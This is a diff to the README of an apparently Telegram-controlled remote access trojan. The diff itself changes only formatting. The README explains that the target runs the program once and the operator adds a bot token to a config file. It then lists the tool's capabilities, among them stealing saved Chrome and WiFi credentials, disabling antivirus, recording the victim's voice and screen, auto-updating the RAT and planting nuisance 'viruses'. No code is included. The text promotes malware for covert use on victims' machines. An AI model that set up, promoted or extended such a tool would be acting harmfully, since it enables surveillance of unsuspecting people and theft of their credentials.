@@ -19,6 +19,7 @@ This program has the ability to fully check the operating system and perform var
 ## Usage
 
 To use and start work, it is enough to open the program once by the target to start creating folders and creating malware.
+
 In order for you to have access to the target, you must carefully edit the <Main_Config.py> file and fill in the requested values. These values ​​are:
 
 - **TelegramToken** | Go to إ[BotFother](t.me/BotFother) and get your bot token.
@@ -37,21 +38,22 @@ In order for you to have access to the target, you must carefully edit the <Main
 ## Facilities
 
 With full implementation and setup, you can see all the commands and capabilities along with the ```/Help``` by sending the help command to the robot.
+
 **Some ّeatures:**
 
-> Taking a Screenshot
-> Recoard Voice
-> Message Box Virus
-> Send Message Box & Message Voice
-> Use Proxy in Script
-> Auto Update RAT
-> Theft Chrome Info Saved
-> Theft Wifi Info Saved
-> SutDown Restart and logOff
-> Disabel AntiVirus
-> Get all hardware and Windows information
-> Ability File Attack, EXE Attack, Swap Mouse Virus
-> Talking With Target
+>> Taking a Screenshot
+>> Recoard Voice
+>> Message Box Virus
+>> Send Message Box & Message Voice
+>> Use Proxy in Script
+>> Auto Update RAT
+>> Theft Chrome Info Saved
+>> Theft Wifi Info Saved
+>> SutDown Restart and logOff
+>> Disabel AntiVirus
+>> Get all hardware and Windows information
+>> Ability File Attack, EXE Attack, Swap Mouse Virus
+>> Talking With Target
 
 & . . .
 
@@ -61,5 +63,5 @@ CopyRight From **MrMrlfex** | For See License Click [Here](https://www.oregon.go
 
 ## Developer
 
-**[MrMelfex[**(https://github.com/MrMelfex)
+**[MrMelfex[(https://github.com/MrMelfex)**
 
